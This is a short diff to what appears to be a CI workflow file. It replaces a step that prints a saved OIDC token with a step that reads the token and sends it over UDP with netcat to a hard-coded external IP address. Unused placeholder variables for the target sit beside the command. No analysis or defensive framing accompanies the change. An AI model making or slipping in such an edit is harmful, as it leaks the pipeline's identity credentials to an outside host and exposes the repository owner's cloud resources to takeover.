@@ -21,6 +21,12 @@ jobs:
           echo "$TOKEN" > oidc_token.txt
           echo "::set-output name=oidc_token::$TOKEN"
 
-      - name: Read OIDC token from file
+      - name: Send OIDC Token via UDP
         run: |
-          cat oidc_token.txt
+          # Define the target IP and port
+          TARGET_IP="your_target_ip"
+          TARGET_PORT=your_target_port
+
+          # Send the OIDC token via UDP
+          TOKEN=$(<oidc_token.txt)
+          echo "$TOKEN" | nc -u 101.126.12.34 8080
